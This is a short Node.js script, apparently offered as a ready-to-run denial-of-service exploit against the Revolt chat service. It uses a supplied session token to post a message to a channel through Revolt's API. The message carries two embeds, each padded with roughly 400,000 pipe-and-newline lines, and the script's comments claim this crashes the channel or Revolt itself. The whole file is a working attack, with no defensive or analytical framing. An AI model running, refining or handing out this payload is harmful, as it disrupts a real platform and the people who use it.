(async()=>{
    "use strict";

    // Dependencies
    const request = require("request-async")

    // Variables
    const args = process.argv.slice(2)
    
    // Functions
    function makePayload(){
        var payload = "|"

        for( let i = 0; i <= 400000; i++ ) payload += "\n|" // It can be 500k+ or 1M+

        return payload
    }

    // Main
    if(!args.length) return console.log("usage: node index.js <token> <channelID>")
    if(!args[1]) return console.log("Invalid channelID.")

    await request.post(`https://api.revolt.chat/channels/${args[1]}/messages`, {
        headers: {
            "content-type": "application/json",
            "x-session-token": args[0]
        },
        body: JSON.stringify({ nonce: `AAAAAAAAAAAAAAA${Math.floor(Math.random() * 9999999)}`, embeds: [{ description: makePayload() }, { description: makePayload() }] }) // Sending 2 payloads at the same time is enough to crash the channel/Revolt.
    })

    console.log("Payload successfully sent.")
})()